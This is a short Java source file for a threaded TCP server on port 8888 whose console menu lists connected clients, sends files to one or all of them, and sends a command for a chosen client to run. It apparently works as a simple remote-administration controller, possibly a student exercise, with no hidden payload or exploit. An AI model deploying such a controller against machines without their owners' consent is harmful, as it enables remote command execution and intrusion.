/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package server;

import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

/**
 *
 * @author mnm
 */
public class main extends Thread {
    List<Server> allclient=new ArrayList<>();

    public main() {
    }
    public void run(){
        try {
            ServerSocket server = new ServerSocket(8888);
            int counter = 0;
            System.out.println("Server Started ....");
            while (true) {
                counter++;
                Socket serverClient = server.accept();  //server accept the client connection request
                System.out.println(" >> " + "Client No:" + counter + " started!");
                Server s = new Server(serverClient, counter); //send  the request to a separate thread
                s.start();
                allclient.add(s);
            }
        } catch (Exception e) {
            System.out.println(e);
        }
    }
    
    public void liststat(){
        for(Server client:allclient){
            if(client.isAlive)
                client.showStat();
        }
    }
    public void sendfile(int clientid,String filepath){
        for(Server client:allclient){
            if(client.clientNo==clientid){
                client.sendFile(filepath);
            }
        }
    }
    public void sendfiletoal(String filepath){
        for(Server client:allclient){
                client.sendFile(filepath);
        }
    }
    
    public void sendcommand(int cid,String command){
        for(Server client:allclient){
            if(client.clientNo==cid){
                client.runCommand(command);
            }
        }
    }
    
    public static void main(String[] args) throws Exception {
        main m=new main();
        m.start();
        while(true){
            System.out.println("==============================");
            System.out.println("please select menu:"
                    + "\n1)List Clients:"
                    + "\n2)Send File to a Client:"
                    + "\n3)Send File to all Client:"
                    + "\n4)Send Command to a Client:");
            Scanner scan = new Scanner(System.in);
            int op=scan.nextInt();
            if(op==1){
                m.liststat();
            }else if(op==2){
                System.out.println("Please get (clientid,filepath):");
                String get=scan.next();
                m.sendfile(Integer.parseInt(get.substring(0,get.indexOf(","))), get.substring(get.indexOf(",")+1));
            }else if(op==3){
                System.out.println("Please get (filepath) to send all:");
                String get=scan.next();
                m.sendfiletoal(get);
            }else if(op==4){
                System.out.println("Please get (clientid,command):");
                String get=scan.next();
                m.sendcommand(Integer.parseInt(get.substring(0,get.indexOf(","))), get.substring(get.indexOf(",")+1));
            }
        }
    }
}
